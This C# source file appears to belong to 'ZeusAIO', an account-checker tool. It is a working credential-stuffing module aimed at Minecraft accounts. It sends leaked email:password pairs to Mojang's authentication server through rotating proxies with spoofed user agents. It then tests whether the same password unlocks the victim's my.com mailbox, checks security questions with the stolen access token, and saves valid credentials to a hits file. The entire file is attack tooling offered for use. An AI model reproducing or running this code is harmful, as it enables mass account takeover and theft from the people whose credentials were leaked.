using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace Minecraft
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0";
                        httpRequest.IgnoreProtocolErrors = true;
                        httpRequest.AllowAutoRedirect = false;
                        httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                       new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                        string text2 = httpRequest.Post("https://authserver.mojang.com/authenticate", "{\"agent\": {\"name\": \"Minecraft\",\"version\": 1},\"username\": \"" + s[0] + "\",\"password\": \"" + s[1] + "\",\"requestUser\": \"true\"}", "application/json").ToString();

                        if (text2.Contains("selectedProfile"))
                        {
                            JObject jsonObj = (JObject)JsonConvert.DeserializeObject(text2);

                            string username = (string)jsonObj["selectedProfile"]["name"];
                            string token = (string)jsonObj["accessToken"];

                            string type = "NFA";

                            if (MailAccessCheck(s[0], s[1]) == "Working")
                            {
                                type = "MFA";
                            }
                            else if (SFACheck(token))
                            {
                                type = "SFA";
                            }

                            ZeusAIO.mainmenu.hits++;
                            if (Config.config.LogorCui == "2")
                            {
                                Console.WriteLine("[HIT - MINECRAFT] " + s[0] + ":" + s[1] + $" | {type} - Username: {username}", Color.Green);
                            }
                            Export.AsResult("/Minecraft_hits", s[0] + ":" + s[1] + $" | {type} - Username: {username}");
                            return false;
                        
                        }
                        else
                        {
                            bool flag8 = text2.Contains("{\"error\":\"ForbiddenOperationException\",\"errorMessage\":\"Invalid credentials. Invalid username or password.\"}");
                            if (flag8)
                            {
                               
                                break;
                            }
                            else if (text2.Contains("{\"error\":\"JsonParseException\",\"errorMessage\":\"Unexpected character "))
                            {
                                    break;
                            }
                            else
                                {
                                    ZeusAIO.mainmenu.realretries++;
                                    goto Retry;
                                }
                        }

                    }
                    //break;
                }
                catch (Exception ex)
                {
                    ZeusAIO.mainmenu.errors++;
                }
            return false;
        }



        static Uri SFACheckUri = new Uri("https://api.mojang.com/user/security/challenges");
        public static bool SFACheck(string token)
        {
            while (true)
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);

                        req.AddHeader("Authorization", "Bearer " + token);
                        string response = req.Get(SFACheckUri).ToString();

                        if (response == "[]")
                        {
                            return true;
                        }
                        else
                        {
                            break;
                        }
                    }

                }
                catch
                {
                    ZeusAIO.mainmenu.errors++;
                }
            }

            return false;
        }


        static string MailAccessCheck(string email, string password)
        {
            while (true)
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);

                        req.UserAgent = "MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0";

                        string strResponse = req.Get(new Uri($"https://aj-https.my.com/cgi-bin/auth?timezone=GMT%2B2&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOS¤t=MyCom&mmp=mail&os=iOS&md5_signature=6ae1accb78a8b268728443cba650708e&os_version=9.2&model=iPad%202%3B%28WiFi%29&simple=1&Login={email}&ver=4.2.0.12436&DeviceID=D3E34155-21B4-49C6-ABCD-FD48BB02560D&country=GB&language=fr_FR&LoginType=Direct&Lang=en_FR&Password={password}&device_vendor=Apple&mob_json=1&DeviceInfo=%7B%22Timezone%22%3A%22GMT%2B2%22%2C%22OS%22%3A%22iOS%209.2%22%2C?%22AppVersion%22%3A%224.2.0.12436%22%2C%22DeviceName%22%3A%22iPad%22%2C%22Device?%22%3A%22Apple%20iPad%202%3B%28WiFi%29%22%7D&device_name=iPad&")).ToString();

                        if (strResponse.Contains("Ok=1"))
                        {
                            return "Working";
                        }
                        break;
                    }
                }
                catch
                {
                    ZeusAIO.mainmenu.errors++;
                }

            return "";
        }


        static void SetBasicRequestSettingsAndProxies(HttpRequest req)
        {
            req.IgnoreProtocolErrors = true;
            req.ConnectTimeout = 10000;
            req.KeepAliveTimeout = 10000;
            req.ReadWriteTimeout = 10000;

            {
                string[] proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount)).Split(':');
                ProxyClient proxyClient = ZeusAIO.mainmenu.proxyProtocol == "SOCKS5" ? new Socks5ProxyClient(proxy[0], int.Parse(proxy[1])) : ZeusAIO.mainmenu.proxyProtocol == "SOCKS4" ? new Socks4ProxyClient(proxy[0], int.Parse(proxy[1])) : (ProxyClient)new HttpProxyClient(proxy[0], int.Parse(proxy[1]));
                if (proxy.Length == 4)
                {
                    proxyClient.Username = proxy[2];
                    proxyClient.Password = proxy[3];
                }
                req.Proxy = proxyClient;
            }
        }



    }
}
